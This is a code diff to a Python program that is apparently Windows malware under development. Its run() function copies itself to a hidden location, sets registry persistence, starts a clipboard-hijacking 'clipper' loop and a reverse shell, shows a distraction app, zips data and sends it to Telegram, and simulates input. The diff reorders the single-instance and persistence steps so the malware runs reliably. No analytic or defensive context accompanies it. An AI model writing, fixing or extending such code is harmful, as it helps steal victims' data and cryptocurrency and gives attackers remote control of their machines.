@@ -623,11 +623,17 @@ def keep_reverse_shell_alive():
 
 
 def run():
-    ensure_hidden_copy()  # ← this ensures you’re running from the hidden copy
+    ensure_hidden_copy()
 
+    # Only allow ONE instance ever (main or hidden)
+    single_instance_check()
+
+    # Always make sure persistence is set
+    persist()
+
+    # From here, run logic ONCE (original or copied, doesn't matter)
     threading.Thread(target=clipper_loop, daemon=True).start()
     threading.Thread(target=keep_reverse_shell_alive, daemon=True).start()
-
     launch_distraction_app()
 
     if not already_exfiltrated():
@@ -645,14 +651,11 @@ def run():
         send_zip_to_telegram()
         mark_exfiltrated()
 
-    persist()  # ← this ensures registry is always pointing to hidden exe
     fake_input()
-    if os.path.abspath(sys.argv[0]).lower() == EXE_PATH.lower():
-        single_instance_check()  # Only enforce one hidden instance
-
 
     while True:
         time.sleep(10)
+
 
 
 
